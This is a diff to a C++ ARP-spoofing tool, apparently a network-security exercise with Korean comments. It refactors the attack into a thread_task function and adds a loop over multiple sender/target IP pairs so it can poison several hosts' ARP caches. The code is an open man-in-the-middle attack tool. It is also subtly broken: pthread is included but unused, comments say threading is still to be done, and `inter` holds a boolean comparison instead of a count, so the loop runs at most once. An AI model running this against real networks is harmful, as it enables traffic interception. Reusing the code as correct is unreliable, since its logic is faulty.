@@ -13,6 +13,7 @@
 #include <malloc.h>
 #include <libnet.h>
 #include <time.h>
+#include <pthread.h>
 
 //MAC주소 길이
 #define MAC_ALEN 6
@@ -72,7 +73,7 @@ int GetInterfaceMacAddress(const char *ifname, Mac *mac_addr, Ip* ip_addr){
     inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
     *ip_addr = Ip(ipstr);
 
-    printf("sucess get interface(%s) MAC/IP",ifname);
+    printf("sucess get interface(%s) MAC/IP\n",ifname);
     close(sockfd);
     return 0;
 }
@@ -255,12 +256,42 @@ void ArpSpoofing(pcap_t* pcap, pcap_t* handle, Ip my_ip, Ip s_ip, Ip t_ip, Mac* 
     }
 }
 
+void thread_task(const char *dev, Ip s_ip, Ip t_ip, Ip my_ip, Mac MAC_ADD){
+    //pcap for getpacket
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (pcap == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return;
+    }
+
+    //pcap for sendpacket
+    char errbuf_2[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf_2);
+        return;
+    }
+
+    Mac MAC_SOURCE;
+    Mac MAC_TARGET;
+
+    //attack packet
+    ArpSpoofing(pcap, handle, my_ip, s_ip, t_ip, &MAC_ADD, &MAC_SOURCE, &MAC_TARGET);
+
+    pcap_close(pcap);
+    pcap_close(handle);
+}
 
 int main(int argc, char* argv[]) {
     if (argc < 3) {
         usage();
         return -1;
+    }else if(argc % 2 != 0){
+        usage();
+        return -1;
     }
+
     char* dev = argv[1];
 
     Mac MAC_ADD;
@@ -269,33 +300,21 @@ int main(int argc, char* argv[]) {
     //MAC_ADD , IP_ADD is my mac & ip
     GetInterfaceMacAddress(dev, &MAC_ADD, &IP_ADD);
 
-    //start arp-spoofing for sender-target set
-    Ip s_ip(argv[2]);
-    Ip t_ip(argv[3]);
+    if (int inter = argc-4 >= 0){
+        //have to make multi-thread
+        printf("have to make multi-thread...\n");
 
-    //pcap for getpacket
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-    if (pcap == nullptr) {
-        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-        return -1;
+        for (int i=0; i<inter; i+=2){
+            //start arp-spoofing for sender-target set
+            Ip s_ip(argv[i+2]);
+            Ip t_ip(argv[i+3]);
+
+            //have to add thread
+            thread_task(dev, s_ip,t_ip,IP_ADD,MAC_ADD);
+        }
     }
 
-    //pcap for sendpacket
-    char errbuf_2[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf_2);
-    if (handle == nullptr) {
-        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf_2);
-        return -1;
-    }
-
-    Mac MAC_SOURCE;
-    Mac MAC_TARGET;
 
 
-    //attack packet
-    ArpSpoofing(pcap, handle, IP_ADD, s_ip, t_ip, &MAC_ADD, &MAC_SOURCE, &MAC_TARGET);
 
-    pcap_close(pcap);
-    pcap_close(handle);
 }
